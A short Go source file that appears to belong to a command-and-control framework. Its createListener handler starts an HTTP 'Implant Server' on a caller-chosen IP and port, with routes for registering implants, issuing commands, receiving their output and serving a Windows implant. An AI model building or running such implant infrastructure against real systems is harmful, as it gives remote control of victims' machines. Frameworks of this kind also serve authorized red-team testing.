package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
)

func createListener(w http.ResponseWriter, r *http.Request) {
	// Decode JSON request body into Listener struct
	decoder := json.NewDecoder(r.Body)
	var listener Listener
	err := decoder.Decode(&listener)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// First server config
	serverIP := listener.IP
	serverPort := listener.Port
	var socket = serverIP + ":" + serverPort

	// Mux for server1
	mux := http.NewServeMux()
	mux.HandleFunc("/registerNewImplant", registerNewImplant)
	mux.HandleFunc("/getCommand", getCommand)
	mux.HandleFunc("/postOutput", postOutput)
	mux.HandleFunc("/agents/windows/cs", windowsImplant)

	go func() {
		fmt.Println("Implant Server: " + socket)
		err := http.ListenAndServe(socket, mux)
		if err != nil {
			log.Fatal("ListenAndServe for socket1: ", err)
		}
	}()
}
